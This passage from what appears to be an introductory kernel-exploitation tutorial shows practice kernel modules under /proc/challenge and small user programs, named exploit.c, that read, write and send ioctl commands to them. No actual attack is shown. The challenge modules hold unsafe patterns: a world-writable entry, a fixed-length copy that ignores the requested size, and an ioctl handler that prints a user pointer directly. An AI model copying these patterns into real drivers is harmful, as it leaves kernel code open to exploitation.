.release = challenge_release
};
int init_module(void)
{
proc_entry = proc_create(&amp;#34;challenge&amp;#34;, 0666, NULL, &amp;amp;fops);
printk(KERN_ALERT &amp;#34;module &amp;#39;/proc/challenge&amp;#39; created&amp;#34;);
return 0;
}
void cleanup_module(void)
{
if (proc_entry) {
proc_remove(proc_entry);
}
printk(KERN_ALERT &amp;#34;module &amp;#39;/proc/challenge&amp;#39; removed&amp;#34;);
}
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>Once we&amp;rsquo;ve compiled the above and started the kernel virtual machine, it&amp;rsquo;s as simple as running the &lt;code>insmod&lt;/code> command to insert the kernel module. There are other commands to do this such as &lt;code>modprobe&lt;/code>, which is better at resolving dependencies, but for this kernel module &lt;code>insmod&lt;/code> is sufficient.&lt;/p>
&lt;p>Running &lt;code>dmesg&lt;/code> we can see that the &lt;code>init_module&lt;/code> function was executed when we inserted the kernel module.&lt;/p>
&lt;pre>&lt;code>/ # insmod ./challenge.ko
/ # dmesg
...
[ 8.437878] challenge: loading out-of-tree module taints kernel.
[ 8.445662] module '/proc/challenge' created
&lt;/code>&lt;/pre>&lt;h2 id="interacting-with-file-based-operations">Interacting with File-based Operations&lt;/h2>
&lt;p>The majority of user interaction with kernel modules is done via file-based operations. Once the kernel module entry has been opened, the module has function handlers for read and write operations. For the sake of simplicity, you can think of this as a kind of file-based socket.&lt;/p>
&lt;p>Interaction is performed first by opening the module entry. When you read from that open file descriptor the kernel module&amp;rsquo;s &lt;code>read&lt;/code> handler is called. When you write to the open file descriptor the kernel module&amp;rsquo;s &lt;code>write&lt;/code> handler is called.&lt;/p>
&lt;p>Below is a pre-written kernel module that can be used for this exercise.&lt;/p>
&lt;p>&lt;a href="https://anvbis.github.io/files/linux-kernel/0/6/challenge.c">challenge.c&lt;/a>&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="3" type="checkbox" checked />
&lt;label for="3">
&lt;span class="collapsable-code__language">c&lt;/span>
&lt;span class="collapsable-code__title">challenge.c&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-c" >&lt;code>
#include &amp;lt;linux/kernel.h&amp;gt;
#include &amp;lt;linux/module.h&amp;gt;
#include &amp;lt;linux/fs.h&amp;gt;
#include &amp;lt;linux/proc_fs.h&amp;gt;
#include &amp;lt;linux/uaccess.h&amp;gt;
MODULE_LICENSE(&amp;#34;GPL&amp;#34;);
struct proc_dir_entry *proc_entry;
static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
{
char data[18] = &amp;#34;Here&amp;#39;s some data!&amp;#34;;
copy_to_user(buf, data, 18);
return 0;
}
static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
{
char data[16];
copy_from_user(data, buf, 16);
printk(KERN_ALERT &amp;#34;Message: &amp;#39;%s&amp;#39;.\n&amp;#34;, data);
return 0;
}
static int challenge_open(struct inode *inode, struct file *fp)
{
printk(KERN_ALERT &amp;#34;device &amp;#39;/proc/challenge&amp;#39; opened&amp;#34;);
return 0;
}
static int challenge_release(struct inode *inode, struct file *fp)
{
printk(KERN_ALERT &amp;#34;device &amp;#39;/proc/challenge&amp;#39; closed&amp;#34;);
return 0;
}
static struct file_operations fops = {
.read = challenge_read,
.write = challenge_write,
.open = challenge_open,
.release = challenge_release
};
int init_module(void)
{
proc_entry = proc_create(&amp;#34;challenge&amp;#34;, 0666, NULL, &amp;amp;fops);
printk(KERN_ALERT &amp;#34;module &amp;#39;/proc/challenge&amp;#39; created&amp;#34;);
return 0;
}
void cleanup_module(void)
{
if (proc_entry) {
proc_remove(proc_entry);
}
printk(KERN_ALERT &amp;#34;module &amp;#39;/proc/challenge&amp;#39; removed&amp;#34;);
}
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>The below proof-of-concept code will do a few things to demonstrate how read / write actions are handled within the kernel module:&lt;/p>
&lt;ul>
&lt;li>It will first open the module entry with read/write access.&lt;/li>
&lt;li>Then it&amp;rsquo;ll perform a read, reading from the kernel module (calling its &lt;code>read&lt;/code> handler function).&lt;/li>
&lt;li>Then it&amp;rsquo;ll perform a write, writing to the kernel module (calling its &amp;lsquo;write` handler function).&lt;/li>
&lt;li>Finally it&amp;rsquo;ll close the file descriptor.&lt;/li>
&lt;/ul>
&lt;p>&lt;a href="https://anvbis.github.io/files/linux-kernel/0/6/exploit.c">exploit.c&lt;/a>&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="4" type="checkbox" />
&lt;label for="4">
&lt;span class="collapsable-code__language">c&lt;/span>
&lt;span class="collapsable-code__title">exploit.c&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-c" >&lt;code>
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;assert.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
int main(int argc, char** argv)
{
/* open the device */
int fd = open(&amp;#34;/proc/challenge&amp;#34;, O_RDWR);
assert(fd &amp;gt; 0);
/* perform a read */
char output[32];
read(fd, output, sizeof(char) * 32);
puts(output);
/* perform a write */
char input[32] = &amp;#34;Hello, World!&amp;#34;;
write(fd, input, sizeof(char) * 32);
/* close the device */
close(fd);
return 0;
}
&lt;/code>&lt;/pre>
&lt;/div>
&lt;pre>&lt;code>~/ $ gcc exploit.c -o exploit -static
&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s start by inserting the kernel module and running our demonstration code. Running &lt;code>dmesg&lt;/code> afterwards we can see the result of our read / write actions.&lt;/p>
&lt;pre>&lt;code>/ # insmod ./challenge.ko
/ # ./exploit
Here's some data!
&lt;/code>&lt;/pre>&lt;pre>&lt;code>/ # dmesg
...
[ 12.547802] challenge: loading out-of-tree module taints kernel.
[ 12.557454] module '/proc/challenge' created
[ 18.904788] device '/proc/challenge' opened
[ 18.909735] Message: 'Hello, World!'.
[ 18.911169] device '/proc/challenge' closed
&lt;/code>&lt;/pre>&lt;h2 id="interacting-with-ioctl">Interacting with IOCTL&lt;/h2>
&lt;p>As mentioned before, ioctl can provide us with much greater control over the way we interact with the kernel. Below is an example kernel module that will perform different actions depending on the input provided.&lt;/p>
&lt;p>Here is a pre-written kernel module that you can use for this exercise.&lt;/p>
&lt;p>&lt;a href="https://anvbis.github.io/files/linux-kernel/0/7/challenge.c">challenge.c&lt;/a>&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="5" type="checkbox" checked />
&lt;label for="5">
&lt;span class="collapsable-code__language">c&lt;/span>
&lt;span class="collapsable-code__title">challenge.c&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-c" >&lt;code>
#include &amp;lt;linux/kernel.h&amp;gt;
#include &amp;lt;linux/module.h&amp;gt;
#include &amp;lt;linux/fs.h&amp;gt;
#include &amp;lt;linux/proc_fs.h&amp;gt;
#include &amp;lt;linux/uaccess.h&amp;gt;
#define HELLO _IO(&amp;#39;p&amp;#39;, 1)
#define GOODBYE _IO(&amp;#39;p&amp;#39;, 2)
MODULE_LICENSE(&amp;#34;GPL&amp;#34;);
struct proc_dir_entry *proc_entry;
static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
{
return -EINVAL;
}
static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
{
return -EINVAL;
}
static int challenge_open(struct inode *inode, struct file *fp)
{
printk(KERN_ALERT &amp;#34;device &amp;#39;/proc/challenge&amp;#39; opened\n&amp;#34;);
return 0;
}
static int challenge_release(struct inode *inode, struct file *fp)
{
printk(KERN_ALERT &amp;#34;device &amp;#39;/proc/challenge&amp;#39; closed\n&amp;#34;);
return 0;
}
static long challenge_ioctl(struct file *filp, unsigned int ioctl_num, unsigned long ioctl_param)
{
if (ioctl_num == HELLO) {
printk(KERN_ALERT &amp;#34;Hello, %s!\n&amp;#34;, (char *)ioctl_param);
}
else if (ioctl_num == GOODBYE) {
printk(KERN_ALERT &amp;#34;Goodbye, %s!\n&amp;#34;, (char *)ioctl_param);
}
return 0;
}
static struct file_operations fops = {
.read = challenge_read,
.write = challenge_write,
.unlocked_ioctl = challenge_ioctl,
.open = challenge_open,
.release = challenge_release
};
int init_module(void)
{
proc_entry = proc_create(&amp;#34;challenge&amp;#34;, 0666, NULL, &amp;amp;fops);
printk(KERN_ALERT &amp;#34;module &amp;#39;/proc/challenge&amp;#39; created\n&amp;#34;);
return 0;
}
void cleanup_module(void)
{
if (proc_entry) {
proc_remove(proc_entry);
}
printk(KERN_ALERT &amp;#34;module &amp;#39;/proc/challenge&amp;#39; removed\n&amp;#34;);
}
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>After compiling our kernel module we&amp;rsquo;ll want to check the values of &lt;code>HELLO&lt;/code> and &lt;code>GOODBYE&lt;/code>, so we can send them to the module via ioctl. We can see that &lt;code>HELLO = 0x7001&lt;/code> and &lt;code>GOODBYE = 0x7002&lt;/code>.&lt;/p>
&lt;pre>&lt;code>~/pwnkernel $ objdump -d src/challenge.ko -M intel
...
000000000000001e &amp;lt;challenge_ioctl&amp;gt;:
1e: 41 54 push r12
20: 48 c7 c7 00 00 00 00 mov rdi,0x0
27: 49 89 d4 mov r12,rdx
2a: 55 push rbp
2b: 89 f5 mov ebp,esi
2d: e8 00 00 00 00 call 32 &amp;lt;challenge_ioctl+0x14&amp;gt;
32: 81 fd 01 70 00 00 cmp ebp,0x7001
38: 75 11 jne 4b &amp;lt;challenge_ioctl+0x2d&amp;gt;
3a: 4c 89 e6 mov rsi,r12
3d: 48 c7 c7 00 00 00 00 mov rdi,0x0
44: e8 00 00 00 00 call 49 &amp;lt;challenge_ioctl+0x2b&amp;gt;
49: eb 27 jmp 72 &amp;lt;challenge_ioctl+0x54&amp;gt;
4b: 81 fd 02 70 00 00 cmp ebp,0x7002
51: 75 11 jne 64 &amp;lt;challenge_ioctl+0x46&amp;gt;
53: 4c 89 e6 mov rsi,r12
56: 48 c7 c7 00 00 00 00 mov rdi,0x0
5d: e8 00 00 00 00 call 62 &amp;lt;challenge_ioctl+0x44&amp;gt;
62: eb 0e jmp 72 &amp;lt;challenge_ioctl+0x54&amp;gt;
64: 89 ee mov esi,ebp
66: 48 c7 c7 00 00 00 00 mov rdi,0x0
6d: e8 00 00 00 00 call 72 &amp;lt;challenge_ioctl+0x54&amp;gt;
72: 31 c0 xor eax,eax
74: 5d pop rbp
75: 41 5c pop r12
77: c3 ret
...
&lt;/code>&lt;/pre>&lt;p>Below is an example interaction with the above kernel module, it&amp;rsquo;ll do several things:&lt;/p>
&lt;ul>
&lt;li>First it&amp;rsquo;ll open the kernel module entry with read/write access.&lt;/li>
&lt;li>Next it&amp;rsquo;ll send the &lt;code>ioctl_num&lt;/code> for the &lt;code>HELLO&lt;/code> command, with a string pointer as the &lt;code>ioctl_param&lt;/code>.&lt;/li>
&lt;li>Next it&amp;rsquo;ll send the &lt;code>ioctl_num&lt;/code> for the &lt;code>HELLO&lt;/code> command, with a string pointer as the &lt;code>ioctl_param&lt;/code>.&lt;/li>
&lt;li>Finally it&amp;rsquo;ll close the file descriptor.&lt;/li>
&lt;/ul>
&lt;p>&lt;a href="https://anvbis.github.io/files/linux-kernel/0/7/exploit.c">exploit.c&lt;/a>&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="6" type="checkbox" />
&lt;label for="6">
&lt;span class="collapsable-code__language">c&lt;/span>
&lt;span class="collapsable-code__title">exploit.c&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-c" >&lt;code>
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;assert.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;sys/ioctl.h&amp;gt;
#define HELLO 0x7001
#define GOODBYE 0x7002
int main(int argc, char** argv)
{
/* open the device */
int fd = open(&amp;#34;/proc/challenge&amp;#34;, O_RDWR);
assert(fd &amp;gt; 0);
/* interact with ioctl here */
char name[7] = &amp;#34;Anvbis&amp;#34;;
ioctl(fd, HELLO, name);
ioctl(fd, GOODBYE, name);
/* close the device */
close(fd);
return 0;
}
&lt;/code>&lt;/pre>
&lt;/div>
&lt;pre>&lt;code>~/ $ gcc exploit.c -o exploit -static
&lt;/code>&lt;/pre>&lt;p>After running our exploit, and checking &lt;code>dmesg&lt;/code>, we can see that the kernel printed &amp;ldquo;Hello, Anvbis!&amp;rdquo; and &amp;ldquo;Goodbye, Anvbis!&amp;rdquo; as per the instructions we sent it via ioctl.&lt;/p>
&lt;pre>&lt;code>/ # insmod ./challenge.ko
/ # ./exploit
&lt;/code>&lt;/pre>&lt;pre>&lt;code>/ # dmesg
...
[ 12.187784] device '/proc/challenge' opened
[ 12.188714] Hello, Anvbis!
[ 12.189492] Goodbye, Anvbis!
[ 12.189747] device '/proc/challenge' closed
&lt;/code>&lt;/pre>&lt;h2 id="appendix">Appendix&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://linux-kernel-labs.github.io/refs/heads/master/labs/kernel_modules.html">The Linux Kernel Documentation - Kernel Modules&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://students.mimuw.edu.pl/SO/Linux-doc/lkmpg.pdf">The Linux Kernel Programming Guide - Talking to Device Files&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://sysplay.github.io/books/LinuxDrivers/book/Content/Part09.html">LinuxDrivers - I/O Control in Linux&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://sysplay.github.io/books/LinuxDrivers/book/Content/Part17.html">LinuxDrivers - Module Interactions&lt;/a>&lt;/li>
&lt;/ul></content></item></channel></rss>